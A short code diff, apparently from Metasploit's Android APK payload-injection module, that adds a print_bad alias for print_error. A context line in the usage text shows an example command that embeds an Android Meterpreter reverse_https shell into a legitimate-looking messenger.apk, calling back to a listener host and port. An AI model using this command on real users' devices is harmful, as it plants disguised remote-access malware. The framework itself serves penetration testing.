@@ -19,6 +19,8 @@ class Msf::Payload::Apk
     $stderr.puts "[-] #{msg}"
   end
 
+  alias_method :print_bad, :print_error
+
   def usage
     print_error "Usage: #{$0} -x [target.apk] [msfvenom options]\n"
     print_error "e.g. #{$0} -x messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443\n"
